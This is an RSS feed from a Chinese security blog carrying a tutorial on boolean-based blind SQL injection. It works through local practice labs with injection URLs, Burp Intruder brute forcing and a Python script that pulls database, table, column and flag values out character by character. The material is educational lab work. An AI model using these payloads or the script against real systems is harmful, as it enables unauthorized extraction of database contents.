<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>My Violet Eva Garden</title>
        <link>https://kiyomijin.github.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Sat, 01 Oct 2022 01:41:34 +0800</pubDate>
        <lastBuildDate>Sat, 01 Oct 2022 01:41:34 +0800</lastBuildDate>
        <category>SQL注入探究</category>
        <category>原创</category>
        <category>数据库安全</category>
        <category>CTF小训</category>
        <category>Misc</category>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</guid>
            <title>布尔盲注</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 01:41:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;sql-注入之布尔盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入之布尔盲注&#34;&gt;#&lt;/a&gt; SQL 注入之布尔盲注&lt;/h1&gt;
&lt;p&gt;本篇使用布尔盲注。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; ：盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;布尔盲注&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;br&gt;
注入的时候只会返回 &lt;code&gt;True和False&lt;/code&gt; ，所以布尔盲注就是根据页面显示的是 &lt;code&gt;True还是False&lt;/code&gt;  进行猜测数据库中的信息。&lt;/p&gt;
&lt;p&gt;布尔盲注需要几个函数的辅助，就先来了解一下这几个函数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;length()函数可返回字符串的长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substring()函数可以截取字符串，可指定开始的位置和截取的长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ord()函数可以返回单个字符的ASCII码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char()函数可将ASCII码转换为对应的字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;具体的用法可以参考大佬的博客&lt;a href=&#34;https://www.jianshu.com/p/f0174ea6c69d&#34;&gt; Mysql 语法介绍&lt;/a&gt;，接下来就通过&lt;strong&gt; sql-labs&lt;/strong&gt; 练习布尔盲注。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;判断注入点&lt;/strong&gt;（也就是闭合符号）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现输入 &lt;code&gt;id=1&#39;&lt;/code&gt;  没有错误回显&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001005755289.png&#34; alt=&#34;image-20221001005755289&#34;&gt;&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;id=1&#39;&lt;/code&gt;  后再加上&lt;strong&gt;注释符号&lt;/strong&gt;后又回显正确，所以判定闭合符号为 &lt;code&gt;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001005844512.png&#34; alt=&#34;image-20221001005844512&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆数据库长度&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于我们知道  &lt;code&gt;select uname = &#39;id&#39; and 1 from xxxx&lt;/code&gt;  在 id 有效的情况下，加入 &lt;code&gt;and 1&lt;/code&gt;  不会影响整体判断&lt;/p&gt;
&lt;p&gt;那么，这里的 1 可以被任何的查询正确的 &lt;code&gt;布尔型判断语句&lt;/code&gt; 返回结果所替代，比如 &lt;code&gt;length(database()) =x &lt;/code&gt; 就可以来代替 1 这个值。&lt;/p&gt;
&lt;p&gt;只有当 x 等于正确的数据库长度时，才能使 &lt;code&gt;and 1 成立&lt;/code&gt; ，才能使整个查询语句回显正确的内容&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=1 --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=2 --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=8 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001010826646.png&#34; alt=&#34;image-20221001010826646&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001010848025.png&#34; alt=&#34;image-20221001010848025&#34;&gt;&lt;/p&gt;
&lt;p&gt;手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为 &lt;code&gt;8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆数据库名&lt;/strong&gt;&lt;br&gt;
知道了数据库名的长度，接下来就来爆破数据库名&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以这一句为基础&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and 1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;继续深入构造爆破查询语句：&lt;/p&gt;
&lt;h3 id=&#34;注入步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入步骤&#34;&gt;#&lt;/a&gt; 注入步骤&lt;/h3&gt;
&lt;p&gt;布尔盲注爆破数据库名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and ascii(substr(database(),1,1))=1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后交给&lt;strong&gt; BurpSuit&lt;/strong&gt; 抓包，选择&lt;strong&gt; Send to Intruder&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;清空变量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#清空变量&#34;&gt;#&lt;/a&gt; 清空变量&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001011237616.png&#34; alt=&#34;image-20221001011237616&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;设置爆破变量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#设置爆破变量&#34;&gt;#&lt;/a&gt; 设置爆破变量&lt;/h4&gt;
&lt;p&gt;首先我们确定好&lt;/p&gt;
&lt;p&gt;ascii(substr(database(), &lt;code&gt;1&lt;/code&gt; ,1))= &lt;code&gt;1&lt;/code&gt;  --+ 这一句中，我标识出来的两个位置【需要我们使用工具&lt;strong&gt;爆破&lt;/strong&gt;】。&lt;/p&gt;
&lt;p&gt;使用 Add$ 来为想要爆破的变量添加上变量符号&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001011541978.png&#34; alt=&#34;image-20221001011541978&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;选择爆破取值范围&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#选择爆破取值范围&#34;&gt;#&lt;/a&gt; 选择爆破取值范围&lt;/h4&gt;
&lt;p&gt;第一个位置， ascii (substr (database (), &lt;code&gt;1&lt;/code&gt; ,1))=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001011859324.png&#34; alt=&#34;image-20221001011859324&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二个位置， ascii (substr (database (),1,1))= &lt;code&gt;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001012047075.png&#34; alt=&#34;image-20221001012047075&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;开始爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#开始爆破&#34;&gt;#&lt;/a&gt; 开始爆破&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001012115998.png&#34; alt=&#34;image-20221001012115998&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于我们的包总长度 &lt;code&gt;根据回显内容不同而发生变化&lt;/code&gt; ，因此，只有&lt;strong&gt;当取值正确的时候包长度会跟其他错误的情况不一样&lt;/strong&gt;，看下图有 8 个情况和其他次数有不一样的结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001012215106.png&#34; alt=&#34;image-20221001012215106&#34;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;payload1 (数据库名第 n 个字符)&lt;/th&gt;
&lt;th&gt;payload2 (数据库名第 n 个字符是什么字符)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;115–&amp;gt;‘s’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;101–&amp;gt;‘e’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;99  --&amp;gt;‘c’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;117–&amp;gt;‘u’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;114–&amp;gt;‘r’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;105–&amp;gt;‘i’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;116–&amp;gt;‘t’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;121–&amp;gt;‘y’&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;综上，数据库名是 &lt;code&gt;security&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;爆破表名，同理&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;小练习：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#尝试报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;①http://127.0.0.1/SQLC/sql-3.php/?id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;②http://127.0.0.1/SQLC/sql-3.php/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;传入的值:id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM users WHERE id=(1) LIMIT 0,1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id=1&amp;#x27;查询失败&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#闭合符号，尝试不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;传入的值:id=1) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM users WHERE id=(1) #) LIMIT 0,1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#布尔盲注&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#1.构造布尔值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and 1 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#2.Burp爆破数据库长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and length(database())=9 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#3.Burp爆破数据库名字&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6-101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7-110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8-103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9-101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;database()=challenge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#4.爆破表名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4-105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6-115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第一个表名emails&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;)) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4-103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第二个表名flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#5.爆破表中的列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&amp;#x27;flag&amp;#x27; limit 1,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;爆破脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&amp;#x27;flag&amp;#x27; limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;)) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#6.爆破值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challeng.flag where flag=&amp;#x27;flag3&amp;#x27; limit 1,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gir&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;附爆破脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#附爆破脚本&#34;&gt;#&lt;/a&gt; 【附】爆破脚本&lt;/h5&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_name&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			r = requests.get(url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Username: kevin&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; r.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				name = name+i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;FINAL target_name:&amp;#x27;&lt;/span&gt;,name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_name()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;脚本爆破数据库名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脚本爆破数据库名&#34;&gt;#&lt;/a&gt; 脚本爆破数据库名&lt;/h5&gt;
&lt;p&gt;url 为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001120214845.png&#34; alt=&#34;image-20221001120214845&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;脚本爆破表名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脚本爆破表名&#34;&gt;#&lt;/a&gt; 脚本爆破表名&lt;/h5&gt;
&lt;p&gt;修改 url 为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出第一个表名 &lt;code&gt;emails&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001115314470.png&#34; alt=&#34;image-20221001115314470&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改 &lt;code&gt;limit 1,1&lt;/code&gt;  爆出第二个表名 &lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001115353280.png&#34; alt=&#34;image-20221001115353280&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;脚本爆破列名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脚本爆破列名&#34;&gt;#&lt;/a&gt; 脚本爆破列名&lt;/h5&gt;
&lt;p&gt;修改 url 为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&amp;#x27;flag&amp;#x27; limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出第一个列名 &lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001114442930.png&#34; alt=&#34;image-20221001114442930&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改 &lt;code&gt;limit 1,1&lt;/code&gt;  爆出第二个列名 &lt;code&gt;value&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001114318316.png&#34; alt=&#34;image-20221001114318316&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;脚本爆破值&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脚本爆破值&#34;&gt;#&lt;/a&gt; 脚本爆破值&lt;/h5&gt;
&lt;p&gt;修改 url 为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challenge.flag where flag=&amp;#x27;flag3&amp;#x27;),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出当 &lt;code&gt;flag=flag3&lt;/code&gt;  时的 &lt;code&gt;value&lt;/code&gt;  值为 &lt;code&gt;gir&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001115921853.png&#34; alt=&#34;image-20221001115921853&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/</guid>
            <title>双注入</title>
